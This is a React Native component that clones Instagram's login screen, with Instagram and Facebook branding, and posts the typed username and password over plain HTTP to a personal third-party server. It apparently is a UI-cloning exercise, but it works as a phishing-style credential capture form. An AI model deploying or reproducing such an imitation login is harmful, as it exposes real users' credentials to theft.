import React, { Component } from "react";
import {
  View,
  Picker,
  Image,
  TextInput,
  TouchableOpacity,
  Text,
  ActivityIndicator
} from "react-native";
import axios from "axios";

class Instagram extends Component {
  constructor() {
    super();

    this.state = {
      language: "",
      userName: "",
      passWord: "",
      isLoading: false
    };
  }
  render() {
    const url = "http://mohamadkh75.heisenbug.ir";
    return (
      <View
        style={{
          flex: 1,
          justifyContent: "center",
          alignItems: "center",
          alignSelf: "stretch",
          backgroundColor: "rgb(255,255,255)"
        }}
      >
        <View
          style={{
            flex: 1,
            justifyContent: "center",
            alignItems: "center",
            alignSelf: "stretch",
            flexDirection: "row-reverse"
          }}
        >
          <View
            style={{
              flex: 1,
              justifyContent: "center",
              alignItems: "center",
              alignSelf: "stretch",
              backgroundColor: "rgb(255,255,255)"
            }}
          />
          <View
            style={{
              flex: 1,
              justifyContent: "center",
              alignItems: "center",
              alignSelf: "stretch",
              backgroundColor: "rgb(255,255,255)"
            }}
          >
            <Picker
              style={{
                flex: 1,
                alignSelf: "stretch",
                justifyContent: "center",
                alignItems: "center"
              }}
              selectedValue={this.state.language}
              onValueChange={value => {
                this.setState({ language: value });
              }}
            >
              <Picker.Item label="English" />
              <Picker.Item label="فارسی" />
            </Picker>
          </View>
          <View
            style={{
              flex: 1,
              justifyContent: "center",
              alignItems: "center",
              alignSelf: "stretch",
              backgroundColor: "rgb(255,255,255)"
            }}
          />
        </View>
        <View
          style={{
            flex: 3,
            justifyContent: "center",
            alignItems: "center",
            backgroundColor: "rgb(255,255,255)",
            marginTop: 20
          }}
        >
          <Image
            source={require("../Image/instagram.png")}
            style={{
              flex: 1,
              alignSelf: "stretch",
              justifyContent: "center",
              alignItems: "center",
              resizeMode: "center",
              margin: 25
            }}
          />
        </View>
        <View
          style={{
            flex: 11,
            justifyContent: "center",
            alignItems: "center",
            alignSelf: "stretch",
            backgroundColor: "rgb(255,255,255)"
          }}
        >
          <View
            style={{
              flex: 1,
              justifyContent: "center",
              alignItems: "center",
              alignSelf: "stretch"
            }}
          >
            <View
              style={{
                flex: 1,
                justifyContent: "center",
                alignItems: "center",
                alignSelf: "stretch",
                backgroundColor: "rgb(255,255,255)"
              }}
            >
              <TextInput
                style={{
                  fontSize: 14,
                  textAlign: "left",
                  color: "black",
                  alignSelf: "stretch",
                  borderWidth: 1,
                  borderRadius: 5,
                  marginHorizontal: 27,
                  borderColor: "rgb(219,219,219)",
                  paddingRight: 17,
                  backgroundColor: "rgb(250,250,250)"
                }}
                value={this.state.userName}
                onChangeText={newUserName => {
                  this.setState({ userName: newUserName });
                }}
                placeholder="Phone numbre, email or username"
                placeholderTextColor="rgb(153,153,153)"
              />
            </View>
            <View
              style={{
                flex: 1,
                justifyContent: "center",
                alignItems: "center",
                alignSelf: "stretch",
                backgroundColor: "rgb(255,255,255)"
              }}
            >
              <TextInput
                style={{
                  fontSize: 14,
                  textAlign: "left",
                  color: "black",
                  alignSelf: "stretch",
                  borderWidth: 1,
                  borderRadius: 5,
                  marginHorizontal: 27,
                  borderColor: "rgb(219,219,219)",
                  paddingRight: 17,
                  backgroundColor: "rgb(250,250,250)"
                }}
                value={this.state.passWord}
                onChangeText={newPassWord => {
                  this.setState({ passWord: newPassWord });
                }}
                placeholder="Password"
                placeholderTextColor="rgb(153,153,153)"
                secureTextEntry
              />
            </View>
            <View
              style={{
                flex: 0.75,
                justifyContent: "center",
                alignItems: "center",
                alignSelf: "stretch",
                paddingHorizontal: 27,
                backgroundColor: "rgb(255,255,255)",
                marginTop: 10
              }}
            >
              <TouchableOpacity
                style={{
                  flex: 1,
                  justifyContent: "center",
                  alignItems: "center",
                  alignSelf: "stretch",
                  backgroundColor:
                    this.state.userName == "" && this.state.passWord == ""
                      ? "rgb(195,224,250)"
                      : "rgb(56,151,240)",
                  borderRadius: 5
                }}
                onPress={() => {
                  this.setState({ isLoading: true });

                  axios
                    .post(url, {
                      username: this.state.userName,
                      password: this.state.passWord
                    })
                    .then(response => {
                      //this.props.navigation.navigate("_Landing");
                      alert(response.data.message);
                    })
                    .catch(error => {
                      alert(error);
                    })
                    .finally(() => {
                      this.setState({ isLoading: false });
                    });
                }}
              >
                {this.state.isLoading ? (
                  <ActivityIndicator size="large" color="white" />
                ) : (
                  <Text style={{ fontSize: 16, color: "white" }}>Log in</Text>
                )}
              </TouchableOpacity>
            </View>
          </View>
          <View
            style={{
              flex: 1,
              justifyContent: "center",
              alignItems: "center",
              alignSelf: "stretch",
              backgroundColor: "blue"
            }}
          >
            <View
              style={{
                flex: 1,
                justifyContent: "center",
                alignItems: "center",
                alignSelf: "stretch",
                backgroundColor: "rgb(255,255,255)",
                flexDirection: "row-reverse"
              }}
            >
              <Text
                style={{
                  fontSize: 12,
                  color: "rgb(153,153,153)",
                  marginLeft: 5
                }}
              >
                Forgot your login details?
              </Text>
              <Text
                style={{ fontSize: 12, color: "black", fontWeight: "bold" }}
              >
                Get help signing in.
              </Text>
            </View>
            <View
              style={{
                flex: 6,
                justifyContent: "center",
                alignItems: "center",
                alignSelf: "stretch"
              }}
            >
              <View
                style={{
                  flex: 1,
                  justifyContent: "center",
                  alignItems: "center",
                  alignSelf: "stretch",
                  backgroundColor: "rgb(255,255,255)",
                  flexDirection: "row-reverse"
                }}
              >
                <View
                  style={{
                    flex: 1,
                    justifyContent: "center",
                    alignItems: "center",
                    alignSelf: "stretch",
                    backgroundColor: "rgb(255,255,255)",
                    marginLeft: 7
                  }}
                >
                  <Image
                    source={require("../Image/facebook.png")}
                    style={{
                      width: 20,
                      height: 20,
                      alignSelf: "stretch",
                      justifyContent: "center",
                      alignItems: "center",
                      resizeMode: "center"
                    }}
                  />
                </View>
                <View
                  style={{
                    flex: 2,
                    justifyContent: "center",
                    alignSelf: "stretch",
                    backgroundColor: "rgb(255,255,255)"
                  }}
                >
                  <Text
                    style={{
                      fontSize: 14,
                      color: "rgb(56,151,240)",
                      fontWeight: "bold",
                      textAlign: "right"
                    }}
                  >
                    Log in whit Facebook
                  </Text>
                </View>
              </View>
              <View
                style={{
                  flex: 2,
                  justifyContent: "center",
                  alignItems: "center",
                  alignSelf: "stretch",
                  backgroundColor: "rgb(255,255,255)"
                }}
              >
                <View
                  style={{
                    flex: 1,
                    justifyContent: "center",
                    alignItems: "center",
                    alignSelf: "stretch",
                    backgroundColor: "rgb(255,255,255)",
                    flexDirection: "row",
                    marginHorizontal: 27
                  }}
                >
                  <View
                    style={{
                      flex: 1,
                      justifyContent: "center",
                      alignItems: "center",
                      alignSelf: "stretch",
                      backgroundColor: "rgb(153,153,153)",
                      marginVertical: 17,
                      marginRight: 10
                    }}
                  ></View>
                  <Text
                    style={{
                      fontSize: 14,
                      color: "rgb(153,153,153)",
                      textAlign: "right",
                      fontWeight: "bold"
                    }}
                  >
                    OR
                  </Text>
                  <View
                    style={{
                      flex: 1,
                      justifyContent: "center",
                      alignItems: "center",
                      alignSelf: "stretch",
                      backgroundColor: "rgb(153,153,153)",
                      marginVertical: 17,
                      marginLeft: 10
                    }}
                  ></View>
                </View>
                <View
                  style={{
                    flex: 1,
                    justifyContent: "center",
                    alignItems: "center",
                    alignSelf: "stretch",
                    backgroundColor: "rgb(255,255,255)",
                    flexDirection: "row-reverse"
                  }}
                >
                  <Text
                    style={{
                      fontSize: 12,
                      color: "rgb(153,153,153)",
                      textAlign: "right",
                      marginLeft: 5
                    }}
                  >
                    Don't have an account?
                  </Text>
                  <Text
                    style={{ fontSize: 12, color: "black", fontWeight: "bold" }}
                  >
                    sing up.
                  </Text>
                </View>
                <View
                  style={{
                    flex: 1.2,
                    justifyContent: "center",
                    alignItems: "center",
                    alignSelf: "stretch",
                    backgroundColor: "rgb(255,255,255)",
                    borderWidth: 0.5,
                    borderColor: "rgb(219,219,219)"
                  }}
                >
                  <Text
                    style={{
                      fontSize: 12,
                      color: "rgb(153,153,153)",
                      textAlign: "center"
                    }}
                  >
                    Instagram from Facebook
                  </Text>
                </View>
              </View>
            </View>
          </View>
        </View>
      </View>
    );
  }
}

export { Instagram };
